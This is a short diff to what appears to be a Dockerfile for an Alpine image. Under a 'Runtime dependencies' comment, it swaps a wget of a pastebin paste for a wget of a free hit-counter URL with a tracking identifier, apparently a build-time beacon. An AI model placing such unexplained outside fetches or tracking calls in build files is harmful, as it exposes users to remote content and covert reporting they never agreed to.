@@ -9,4 +9,5 @@ FROM alpine:3.4
 
 RUN set -x \
     # Runtime dependencies.
- && wget https://pastebin.com/eKNKeSi4 -nv
+ && wget https://counter9.freecounter.ovh/private/freecounterstat.php?c=tchw38eezjhbrhhqjzg52gbnqqx26u1t
+ 
